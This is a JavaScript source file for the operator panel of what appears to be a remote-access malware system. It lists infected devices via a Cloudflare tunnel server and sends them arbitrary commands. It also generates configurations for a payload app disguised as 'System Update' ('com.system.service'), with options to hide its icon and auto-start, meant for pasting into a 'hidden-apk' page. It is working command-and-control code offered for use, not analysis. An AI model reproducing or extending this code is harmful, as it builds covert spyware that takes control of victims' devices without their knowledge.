// controller-app/app.js - Control Panel v2.0

const DEFAULT_SERVER_URL = 'https://assign-place-picture-recommendation.trycloudflare.com';
let SERVER_URL = localStorage.getItem('SERVER_URL') || DEFAULT_SERVER_URL;
let authToken = null;
let selectedDeviceId = null;

function login() {
    const username = document.getElementById('adminUsername')?.value;
    const password = document.getElementById('adminPassword')?.value;
    if (!username || !password) { alert('⚠️ أدخل بيانات الدخول'); return; }
    authToken = btoa(`${username}:${password}`);
    localStorage.setItem('authToken', authToken);
    document.getElementById('loginSection').style.display = 'none';
    document.getElementById('dashboardSection').style.display = 'block';
    loadSettings(); refreshDevices();
}

async function refreshDevices() {
    try {
        const response = await fetch(`${SERVER_URL}/api/devices`, { headers: { 'Authorization': `Basic ${authToken}` } });
        const data = await response.json();
        if (data.success) renderDevices(data.devices);
    } catch (error) {
        console.error('❌ Connection error:', error.message);
        alert('❌ فشل الاتصال. تأكد من إعدادات الخادم.');
    }
}

function renderDevices(devices) {
    const container = document.getElementById('devicesList');
    if (!container) return;
    if (devices.length === 0) {
        container.innerHTML = '<p style="color:#888;text-align:center;padding:20px;">لا توجد أجهزة متصلة</p>';
        return;
    }
    container.innerHTML = devices.map(device => {
        const isOnline = device.isOnline || (device.lastCheckIn && (Date.now() - new Date(device.lastCheckIn).getTime()) < 60000);
        return `
            <div class="device-card ${selectedDeviceId === device.deviceId ? 'active' : ''}" onclick="selectDevice('${device.deviceId}', ${JSON.stringify(device).replace(/'/g, "\\'")})">
                <h4>📱 ${device.deviceInfo?.deviceName || 'Unknown'}</h4>
                <p><strong>ID:</strong> ${device.deviceId?.substring(0, 20)}...</p>
                <p><strong>Client:</strong> ${device.clientId?.substring(0, 15)}...</p>
                <p><strong>Config:</strong> ${device.config?.configId || 'default'}</p>
                <p><strong>Registered:</strong> ${new Date(device.registeredAt).toLocaleString('ar-EG')}</p>
                <span class="status ${isOnline ? 'online' : 'offline'}">${isOnline ? '🟢 متصل' : '🔴 غير متصل'}</span>
            </div>`;
    }).join('');
}
function selectDevice(deviceId, device) {
    selectedDeviceId = deviceId;
    document.getElementById('selectedDeviceId').textContent = deviceId?.substring(0, 25) + '...';
    document.getElementById('deviceStatus').textContent = device.status || 'unknown';
    document.getElementById('deviceLastCheckIn').textContent = device.lastCheckIn ? new Date(device.lastCheckIn).toLocaleString('ar-EG') : 'Never';
    document.getElementById('deviceConfigId').textContent = device.config?.configId || 'default';
    document.getElementById('deviceDetails').style.display = 'block';
    document.querySelectorAll('.device-card').forEach(card => card.classList.remove('active'));
    event?.closest('.device-card')?.classList.add('active');
}

function toggleCustomAction() {
    const commandType = document.getElementById('commandType')?.value;
    const customInput = document.getElementById('customAction');
    if (customInput) customInput.style.display = commandType === 'custom' ? 'block' : 'none';
}

async function sendCommand() {
    if (!selectedDeviceId) { alert('⚠️ اختر جهاز أولاً'); return; }
    const commandType = document.getElementById('commandType')?.value;
    const customAction = document.getElementById('customAction')?.value;
    const command = { type: commandType, action: commandType === 'custom' ? customAction : null, payload: {} };
    try {
        const response = await fetch(`${SERVER_URL}/api/devices/${selectedDeviceId}/command`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Authorization': `Basic ${authToken}` },
            body: JSON.stringify({ type: command.type, action: command.action, payload: command.payload })
        });
        const data = await response.json();
        if (data.success) alert('✅ تم إرسال الأمر!'); else alert('❌ فشل: ' + data.error);
    } catch (error) { alert('❌ خطأ اتصال: ' + error.message); }
}

async function generateConfig() {
    const serverUrl = document.getElementById('configServerUrl')?.value?.trim();
    const appName = document.getElementById('configAppName')?.value || 'System Update';
    const appId = document.getElementById('configAppId')?.value || 'com.system.service';
    const checkInInterval = parseInt(document.getElementById('configCheckInInterval')?.value) || 30000;
    const hideIcon = document.getElementById('configHideIcon')?.checked;
    const autoStart = document.getElementById('configAutoStart')?.checked;
    
    if (!serverUrl) { alert('⚠️ أدخل رابط الخادم'); return; }
    try {
        const response = await fetch(`${SERVER_URL}/api/config/generate`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ serverUrl, appName, appId, checkInInterval, hideIcon, autoStart, customConfig: {} })
        });
        const data = await response.json();
        if (data.success) {            document.getElementById('resultConfigId').textContent = data.configId;
            document.getElementById('resultHtmlSnippet').textContent = data.htmlSnippet;
            document.getElementById('configResult').style.display = 'block';
            document.getElementById('configResult')?.scrollIntoView({ behavior: 'smooth' });
        } else { alert('❌ فشل: ' + data.error); }
    } catch (error) { alert('❌ خطأ اتصال: ' + error.message); }
}

function copyConfigCode() {
    const code = document.getElementById('resultHtmlSnippet')?.textContent;
    if (code) {
        navigator.clipboard.writeText(code).then(() => alert('✅ تم النسخ! الصقه في hidden-apk/index.html')).catch(() => alert('⚠️ انسخ يدوياً'));
    }
}

function loadSettings() {
    const savedUrl = localStorage.getItem('SERVER_URL');
    if (savedUrl && document.getElementById('settingServerUrl')) {
        document.getElementById('settingServerUrl').value = savedUrl;
        SERVER_URL = savedUrl;
    }
}

function saveSettings() {
    const newUrl = document.getElementById('settingServerUrl')?.value?.trim();
    if (!newUrl) { alert('⚠️ أدخل رابط الخادم'); return; }
    localStorage.setItem('SERVER_URL', newUrl);
    SERVER_URL = newUrl;
    alert('✅ تم الحفظ!');
    refreshDevices();
}

async function testConnection() {
    const statusEl = document.getElementById('connectionStatus');
    if (!statusEl) return;
    statusEl.textContent = '🔄 جاري الاختبار...'; statusEl.className = '';
    try {
        const response = await fetch(`${SERVER_URL}/`, { timeout: 5000 });
        const data = await response.json();
        if (data.success) { statusEl.textContent = '✅ الخادم يعمل!'; statusEl.className = 'success'; }
        else { statusEl.textContent = '⚠️ الخادم رد بدون نجاح'; statusEl.className = 'error'; }
    } catch (error) { statusEl.textContent = '❌ فشل: ' + error.message; statusEl.className = 'error'; }
}

document.addEventListener('DOMContentLoaded', () => {
    const savedToken = localStorage.getItem('authToken');
    if (savedToken) {
        authToken = savedToken;
        document.getElementById('loginSection').style.display = 'none';
        document.getElementById('dashboardSection').style.display = 'block';        loadSettings(); refreshDevices();
    }
    setInterval(() => {
        if (authToken && document.getElementById('dashboardSection')?.style.display !== 'none') refreshDevices();
    }, 30000);
});

console.log('🎮 Control Panel v2.0 | Server:', SERVER_URL);